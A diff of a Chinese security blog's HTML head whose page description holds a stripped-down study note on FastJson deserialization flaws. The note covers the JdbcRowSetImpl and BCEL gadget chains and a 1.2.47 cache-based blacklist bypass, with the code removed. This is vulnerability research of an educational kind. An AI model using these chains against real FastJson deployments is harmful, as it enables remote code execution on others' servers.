@@ -1,341 +1,217 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="keywords" content="Hexo Theme Redefine">
-    
-    <meta name="author" content="stoocea">
-    <!-- preconnect -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>FastJson反序列化学习 | stoocea</title><meta name="author" content="stoocea"><meta name="copyright" content="stoocea"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="FastJson反序列化学习"><meta name="application-name" content="FastJson反序列化学习"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="FastJson反序列化学习"><meta property="og:url" content="http://example.com/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"><meta property="og:site_name" content="stoocea"><meta property="og:description" content="首先是准备的maven依赖1.2.24是最开始FastJson爆出来的漏洞的那个版本 &amp;lt;dependency&amp;gt;   &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;&amp;#x2F;groupId&amp;gt;   &amp;lt;artifactId&amp;gt;fastjson&amp;lt;&amp;#x2F;artifactId"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg"><meta property="article:author" content="stoocea"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg"><meta name="description" content="首先是准备的maven依赖1.2.24是最开始FastJson爆出来的漏洞的那个版本 &amp;lt;dependency&amp;gt;   &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;&amp;#x2F;groupId&amp;gt;   &amp;lt;artifactId&amp;gt;fastjson&amp;lt;&amp;#x2F;artifactId"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: stoocea","link":"链接: ","source":"来源: stoocea","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'stoocea',
+  title: 'FastJson反序列化学习',
+  postAI: '',
+  pageFillDescription: '1.FastJson概述, fastjson简单实现, FastJson根据字符串任意反序列化, FastJson反序列化流程分析, @type指定加载类, 对指定类的参数处理, 获取构造器, 调用构造器的deserialze方法进行最终解析, FastJson流程总结以及漏洞点分析, FastJson漏洞利用前的流程总结, FastJson反序列化漏洞攻击利用总结, 入口类 JdbcRowSetImpl分析, （Bcel）入口类ClassLoaderEXP分析, FastJson高版本绕过, 1.2.25之后的新增waf检测流程分析, mapping缓存绕过流程, FastJson快速复习总结, FastJson1.2.24流程, JdbcRowSetImpl, Bcel, FastJsonltx3D1.2.47高版本绕过首先是准备的依赖是最开始爆出来的漏洞的那个版本本次学习结合组长的视频以及各师傅的博客概述在学习的安全漏洞之前我们首先得了解一下什么是是阿里巴巴的开源解析库它可以解析格式的字符串支持将序列化为字符串也可以从字符串反序列化到主要是两个接口来分别实现序列化和饭序列化操作将对象转化为对象也就是序列化的过程将对象重新转化为对象顾名思义反序列化的过程以往的序列化和反序列化的过程中间都是序列化数据在承担运载数据的作用但是在中就是用特殊的数据承载这个任务了还需要注意的一点是在中并不是所有的对象都能够被转化为只有格式的对象才能够转化为简单实现写一个类简单格式的构造函数然后写一个作用类将对象序列化序列化过程如下将对象的序列化数据反序列化成一个反序列化过程如下用方法进行反序列化用方法进行反序列化用方法反序列化的另一种形式指定类将数据反序列化成一个指定的对象作用结果如下能够正常调用对象里面的方法进一步的分析这次我们给对象内写入构造方法然后给每一个调用方法写一个来标识它的调用将对象序列化序列化过程如下将对象的序列化数据反序列化成一个反序列化过程如下用方法进行反序列化用方法进行反序列化用方法反序列化的另一种形式指定类将数据反序列化成一个指定的对象结果如下发现的反序列化过程是通过调用指定的方法去对参数赋值而不是反射之类期间也会调用构造方法直到现在都没啥问题也没有什么漏洞点但是提供了一种可以任意反序列化类的方式根据字符串任意反序列化假如说我们在数据中加入字段我们就可以指定加载任意类了比如说这里的就是指定的地址效果图如下发现不论是执行方法还是我们自己指定的方法都是可以正常执行的而且构造方法也能执行这个时候就嗅到一丝味道了我们客户端能够控制输入并且服务端能够根据传入的数据执行不同的代码逻辑就很像是一句话木马的意思我们跟进他的具体方法内容以及流程分析一下反序列化流程分析如果说选择指定加载的对象类型跟进到方法流程回不一样但处理的类都是差不多的这里我们选择用单字符串的加载就是仅加载我们客户端指定的对象指定加载类在行下个断点然后跟进去来到类的方法他这里会继续调用方法继续跟进稍显套娃两个方法紧挨着当调用到第二个方法时开始调用类的构造方法也就是获取到一个解析器去解析我们传过来的数据具体构造就不看了我们跟进到下面的方法调用来到类的方法这里就会将我们的传过来的字符串从左往右一个一个字符去解析比如第一个是左大括号那就调用到的内容先是实例化一个左大括号的对象然后返回方法调用结果继续跟进由于接下来的内容过多只截取部分关键代码记录过程刚进方法的时候先把我们传进来的字符串转化为一个对象该对象的类型是一个键值对格式然后就是边界的确定和检测之后就开始一个字符一个字符的进行加载说它代码量较多的原因就是因为下面的的内容先截取一部分理解这里有一个的死循环他里面的内容必须要有或者才能出来这里调试的时候并没有循环很多次一次出来其实这个循环的作用是根据来给分类也就是对数据处理下面会对区分的部分进行匹配就比如说循环出来之后他就匹配到第一个里面的内容字符将他获取出来之后继续跟进到如下地方这边会首先进行一个判断是否为其实这个就是所以进入该语句的内容关键点肯定是这个我们跟进内容较多总结一下功能实现先判断我们传进来的是否为空或者是否存在然后进行下一步之后判断是否在本地缓存中已经加载过了如果有就直接放回然后就是一些特殊情况的判断数组之类的最后调用上下文的来加载这个指定类然后将他放到缓存中最终返回需要注意的是这一步确实是加载到了指定的类但是类里面我们指定的属性值还没有赋值进去所以之后还需要经过一层特有的反序列化操作将这些事情做完对指定类的参数处理继续调试跟进来到这部分处理也就是指定加载类之后我们后续的对于类中属性值如何赋值的流程获取构造器首先根据我们刚才加载到的来获取一个解析器然后调用该解析器的方法我们首先来看解析器的获取他这里其实也有一个本地缓存的解析器获取的过程其实就是在本地写了一些操作把可能用到的解析器都到中这是我们自己定义的类肯定是没有的我们跟进到下面的方法只提几点需要注意的这里有一个获取注解的功能相当于自己写一个解析器的功能但是基本上用不到因为控制端不在客户端我们无法控制然后会进入一个循环去匹配他的黑名单这里的黑名单不是对反序列化攻击的而是有些限制或者说是性能上的限制最后的时候经过一些列的判断会调用到这个方法来创建一个的解析器来对我们的指定类进行反序列化继续跟进就行对于方法来说前面很多内容都是关于能不能用的判断跟我们这次反序列化调试流程没有太大关系我们直接跳到关键步骤来到下一个步骤调用方法这是一个比较关键的方法指定对象中的属性值和构造方法就是在这里被访问的继续跟进首先是各类值的获取包括是否有注解以及属性值的获取还有构造方法的获取之后就是一段判断判断一下指定类的默认构造是否获取正常然后判断指定类是否为接口或者抽象类显然我们整个攻击流程都不会进入这个判断的内容我们接着往下走判断一下构造方法是否存在然后给方法设置一下权限之后是三段长循环内容我们先看整体结构了解这最后的三段循环是在干什么第一次和第三次循环的条件是具体一点是第一次是在获取方法而第三次循环是在获取方法中间的循环条件是字段属性值个人猜测是获取到构造方法后对指定类的值进行处理我们先看第一段循环的内容获取所有方法然后对每个方法进行个判断如果该方法名字符数量小于不做进一步处理如果该方法是静态方法如果该方法的返回值不为空获取到该方法的参数数量如果不为其实总结下来他其实就是在寻找方法也就是我们指定类中的等赋值的方法这也就是为什么能转化的类只能是因为必须要有和方法之后就是各种特殊情况的判断全体转小写之类的处理直接跟进到最后的方法之前肯定是里面构造方法实现这里不做过多的代码展示这一块有一个比较重要的内容就是这个参数的设置他的判断是如果我们现在给定的方法的参数值不唯一参数设置为如果方法只有一个参数就进入内容不会设置记录一下之后会碰到涉及到的开关也就是会不会产生构造器来解析数据至于为什么不用生成的解析器是因为的解析器是一个临时创建的类我们跟进分析不到其实后面的分析流程可以不用看了我们重新跟进一遍只不过这一遍需要我们稍作处理也就是上面这两个条件第一个肯定容易满足这个方法是否存在这个没啥好说的第二个是当前方法传入的参数的数量不为也就是我们这个方法传入参数数量不能为以为很好满足实际上这第一个循环有一个判断如果参数数量不为就给我下一个了也就是说第一个循环关于的设置是不存在的既然他叫理应考虑第三个循环方法获取的内容其实第三个循环的内容重要区别就在于他没这段的判断了但是多了两层我们好实现的判断一个是参数值是即可绕过一个是只有该方法的返回类型满足下面这几个即可后续的方法以及创建的内容都是一样的所以除了满足上述两个条件接下来只需满足前的两段即可而这两段早在参数值为时就已经算是绕过了因为一层为判断该方法是否为空另一个就是判断该方法参数数量是否为改一下我们的这个指定类的属性值其实也就是多了个类型为的属性值然后关于该属性值的方法只有方法没有方法且参数值为即可之后我们重新调试一遍来到第三遍循环然后直接跳到方法中的构造方法运行下来发现进入了的内容将设置为所以到目前为止我们有了一个拥有为的返回值了也就是中包含字段这个时候其实当我们跳出方法继续的流程发现他会遍历我们的刚才生成的依次寻找构造器而当遍历到的时候他会把这个开关关闭改成然后就是重新调用构造一遍构造完毕之后完成彻底创建好了这个开始调用它的方法调用构造器的方法进行最终解析这里的代码内容依然很多我们只讲关键部分的遍历在这个遍历到循环之前的主要工作是对于数据边界的一个识别还有一些默认的检测先获取所有字段及其内容然后就是大段的根据数据的检测直到开始实例化指定的对象具体内容就不看了实例化之后就是调用里面的和方法了先是调用里面很多判断用来提前准备具体内容对整体流程没有影响最终也只是直接调用方法然后看一下已经进行完了构造函数以及方法之后就是循环的过程了一个一个的调用而你会问我们的方法是在哪调用的呢其实是我们进行完最开始的方法之后他最后还调用了方法在方法里面调用到方法整个反序列化的流程就是这些我们之后稍微总结一下流程总结以及漏洞点分析方法作为入口进入流程此时分为了两步一是先将这个指定的类加载出来此时对于里面的方法以及属性值都没有操作的第二步开始获取构造器准备用构造器来对数据的内容进行解析解析的过程中调用了方法去赋值最后解析完毕之后又调用方法触发了方法去实现所以漏洞出在哪呢其实就是它对指定类的方法以及方法调用会直接执行它方法里面的内容我们写一个恶意类执行一下这里采用方法去执行恶意方法执行条件之后总结执行完毕其实会发现就算不是格式的类也会去解析这是因为在获取构造器的时候本地没有对应加载器它都会当作去解析导致后面的流程其实是一样的漏洞利用前的流程总结这里的内容不仅是为后续的漏洞利用做铺垫也是为了给之后复习留一点余地能够快速回忆提供了一种特有的反序列化方式当然序列化的数据是格式第一次跟进一步他会先进入一段也是在这条流程中进行的解析首先是根据来解析指定类当然这一步还没完后续他会先获取解析器在获取解析器的过程中流程跟进到类中的三段循环中这三段循环分别是获取到所有的方法以及获取到所有的字段最后是获取到所有的方法获取解析器完毕之后我们回到了类调用该解析器的方法去调用方法进行赋值赋值完毕之后算是真正实例化完毕数据所指定的对象上述第一步做完之后还会进行一次方法也是这里进行的方法获取变量漏洞直接利用点就出在在获取完解析器之后的调用方法中他会直接调用方法还有一个出自方法这里面直接调用了方法利用条件的话主要是在中获取构造器的方法后续调用到的中三段的获取方法如果想要获取到他的传入参数只能是个方法想要能够获取到方法必须是这四个类型并且传入参数值必须是反序列化漏洞攻击利用总结首先需要提出的序列化不是调用到的原生的序列化这个是他自己根据数据实例化出来的对象两者的相同点都是最后会执行恶意方法或者调用静态代码块进而执行恶意代码类比原生反序列化的反序列化采用它自己的反序列化器一个入口点在一个就在或者明确目的之后肯定就是一番寻找这里我们先给出结论再看有没有可能自己总结出寻找的理由所以要能够当作的攻击链部分需要满足如下条件如果是非静态函数返回类型为或者当前类参数个数为如果是非静态方法无参数返回类型必须是或继承自或或或或上述条件都是最后获取构造器的时候三段循环中的内容也就是第一段循环以及第三段循环能否获取到指定或者方法条件如果不能获取那还提什么调用呢入口类分析版本限制至少版本以下在版本必须能够出网这很明显是一个实现类这个类里面本来的作用我们先不看在类中有个很熟悉的地方你会发现它在方法中有一段很明显存在注入的地方先初始化一下然后就是调用这里其实就是最后的利用点了但是事先我们还是得确认一点的参数可控查看调用之后发现确实可控那我们继续下一步推进我们再看看哪里调用了还是同样的类中方法正好有一个和方法那我们这里该如何取舍呢首先要知道方法在的解析过程中是必须进行完数据解析也就是调用之后才能调用到的方法那假如说我们选定方法作为节点调入很容易就在数据解析的时候就被报错下来所以这里我们保险起见采用方法如下这里的地址可以通过生成或者自己起一个关于的服务那既然用了其实就有版本限制了至少是之前的版本但是又有一个问题不知道是不是我自身问题就是只有在的较高版本才能找到最终方法调用路径入口类分析上述是必须出网的攻击那么这里就学习一种不出网的攻击主要经过的是这个类其实算是最终利用类了最终是走到它的通过字节码来加载类直接往前寻找其实不太现实很多类加载相关的类都有这个这里我们找到了一个自带的类能够指定选用类加载器那如果我们指定该的就可以实现链子的拼接这个类叫做在它的方法中实现了这个功能找到了该方法后其实下一步就是看这两个参数与是否可控了也就是找这两个变量的方法确定完这两个事之后呢下一件事就是寻找上一步的相关调用了最终还是在这个类里面的确定了入口是的入口而且也满足成为可获取的那个方法所以链子的话就是需要注意的是在最终中还有一些需要前置条件必须要有字样在类名的前位必须执行方法处理一下我们的恶意类字节码满足这两种条件之后就可以到通过字节码加载恶意类了如下当然这个只是模拟一下调用流程也就是直接运行一下我们的链子为的是熟悉在调用前的处理接下来是通过触发链子的最终调用的方法之前还需满足的两个条件一个是必须调用进行编码原因在于它会在流程中调用方法至此的链子分析差不多了但是网上的比较常用的那条链子没有分析链居多除非题目非要考很少遇得到实用性不高我们接下来分析高版本的绕过高版本绕过这里的高版本指直到写这篇笔记的时候也只研究到这里暂待补充之后的新增检测流程分析在的时候进行了一次修复主要是存在于方法的某个逻辑中进行了一次判断之前在的时候就直接初步加载了我们进方法看看其实刚开始就是两个很重量级的白名单和黑名单也就是两个循环执行的内容其实白名单刚进来的时候是为空的它是直接向配置文件加载而黑名单就是写死的我们之前学的两条链子基本上都不能打了这里就出现了第一次分支如果在白名单里面直接加载如果在黑名单里面就抛异常结束程序这里我们先打住记住这次分支假如说我们指定的加载类即不在黑名单内也不在白名单内就下一步下一步开始就是寻找指定类了首先会从一个里面寻找如果没找到就又去解析器里面去找看之前历史有没有加载过这个类所以第二次分支是经过这两次判断也就是内存中找历史加载缓存中寻找之后如果找到了直接返回该类如果没找到进入下一步而在下一步之前又过了一遍白名单和黑名单因为此时是始终没有经过我们修改的所以为会进入本次黑白名单检测那很明显我们现在想要绕过白名单或者黑名单都是不太可能的两次黑白名单的内容是不一样的比如说我这次调试的包底下的类第一次黑白名单检测的时候就没有被查出来而第二次就被查出来了再往下走呢其实也不存在正常加载的可能因为始终都是默认状态后续的检测基本上都是需要为才能加载其实这里的思路就断了我们重新回到之前第二个分支路口也就是首先从缓存中找是否有指定类然后再从解析器的解析历史中找是否有加载的缓存的那一部分缓存绕过流程首先看看这个缓存能否可控查看几经寻找我们能够控制类名指定加载的方法也终于还是包里面的类种找到了符合条件的地方我们跳到源码处只查看关键部分也就是我们的地方这里就是加载过后将我们本次加载的类放进的缓存那么接下来就是找哪里调用了这个了并且参数可控最为理想的是类中的这个方法我们跟进到源码也就是直接调用的地方他这里的代码逻辑是说当我们传进来的类型是的时候就调用注意此时类中有个参数我们跟进到会发现被指定加载之前会被直接放进缓存然后我们回到获取反序列化器的类发现在默认的键值对中已经存入了类型匹配类型的解析器所以可以触发后续的流程其实到这就差不多了我们可以来捋一捋思路首先肯定要先传入一个类型的对象那么在经过方法的时候就肯定可以返回了类了而不是被掉然后就是获取反序列化器进行反序列化我们这边看到它的是然后调用的方法跟进到如下内容它会先判断有没有变量之后就是将我们的变量中的指定类实例化这个实例化的过程肯定是走到了的方法类加载一遍之后放入缓存然后呢我们又指定加载一次类并且后续的于的值还是照旧就能够从缓存中直接读到的类加载绕过后面流程就是一样了三次循环取静态变量之后依次调用取得的和所以可以据此得到第一步反序列化一个类值为恶意类这里还是用就行快速复习总结这里我还是推荐徐少的学习路线或者组长的博客本人写的文章有很大一部分是自学和快速复习用的不具备参考价值其实反序列化漏洞的本质就是代码执行只不过原生的反序列化调用的是它调用的是和所以跟原生的反序列化的思路是差不多的但是的实现比较简单自己构造就行原生的话就比较麻烦流程总共两条链子一条是链一条是链我们逐一分析最常用的一条链子基本流程如下如下是最后参数可控的设置然后其实传什么都可以只要是类型即可然后这里其实最终用到的还是的东西所以都要注意版本注意条件必须出网且在及以下这个是解决无法出网问题而产生的链子说是其实是包下的一个类经由它来进行字节码加载类然后为了这个功能往前找链子基本流程如下其实这条链子并没有多少自己探寻的路程毕竟往前找到还能有信心往前找到或者就已经很亏则了格式如下反序列化的类就是嘛然后由于对于方法以及方法的获取只要符合条件在第一次获取构造器的末尾的三段循环都会给获取到之后就是会将调用以及在中将调用符合条件所以会被获取自然也会被调用触发链子高版本绕过高版本要绕过的只有一处地方就是方法会设置白名单和黑名单我们需要事先将我们需要反序列化的恶意类存入它的白名单才能让后续的恶意类成功加载这个怎么实现呢当我们传入对象的时候他会调用解析器进行解析而的方法会调用指定对象的那我们可以传入包下的以及恶意类作为目标成功加载一遍实现存入缓存然后再进行一次恶意类的解析就能够绕过检测了格式如下是中需要的对象然后第二次数据就是跟低版本的一样了',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-12 11:33:35',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
     
-    <!--- Seo Part-->
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
     
-    <link rel="canonical" href="http://example.com/post/fastjson反序列化.html"/>
-    <meta name="robots" content="index,follow">
-    <meta name="googlebot" content="index,follow">
-    <meta name="revisit-after" content="1 days">
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
     
-        <meta name="description" content="首先是准备的maven依赖1.2.24是最开始FastJson爆出来的漏洞的那个版本 &lt;dependency&gt;   &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;   &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;   &lt;version&gt;1.2.24&lt;&#x2F;version&gt;   &amp;lt">
-<meta property="og:type" content="article">
-<meta property="og:title" content="FastJson反序列化学习">
-<meta property="og:url" content="http://example.com/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html">
-<meta property="og:site_name" content="stoocea">
-<meta property="og:description" content="首先是准备的maven依赖1.2.24是最开始FastJson爆出来的漏洞的那个版本 &lt;dependency&gt;   &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;   &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;   &lt;version&gt;1.2.24&lt;&#x2F;version&gt;   &amp;lt">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/1.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/2.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/3.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/4.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/5.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/7.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/8.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/9.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/10.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/11.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/12.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/13.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/14.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/15.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/16.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/17.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/18.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/19.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/20.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/21.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/22.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/23.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/24.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/25.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/26.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/28.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/27.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/29.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/30.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/31.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/32.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/33.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/34.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/35.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/36.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/37.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/38.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/39.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/40.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/41.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/42.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/43.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/44.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/45.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/46.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/47.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/48.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/49.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/50.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/51.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/52.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/53.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/54.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/55.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/56.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/57.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/58.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/59.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/60.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/61.png">
-<meta property="og:image" content="https://stoocea.github.io/images/FastJson/62.png">
-<meta property="article:published_time" content="2023-11-10T03:09:51.000Z">
-<meta property="article:modified_time" content="2023-11-12T03:33:35.369Z">
-<meta property="article:author" content="stoocea">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://stoocea.github.io/images/FastJson/1.png">
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-    
-    <!--- Icon Part-->
-    <link rel="icon" type="image/png" href="https://stoocea.github.io/images/rj3.jpg" sizes="192x192">
-    <link rel="apple-touch-icon" sizes="180x180" href="https://stoocea.github.io/images/rj3.jpg">
-    <meta name="theme-color" content="#A31F34">
-    <link rel="shortcut icon" href="https://stoocea.github.io/images/rj3.jpg">
-    <!--- Page Info-->
-    
-    <title>
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
         
-            FastJson反序列化学习 -
-        
-        stoocea blog
-    </title>
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
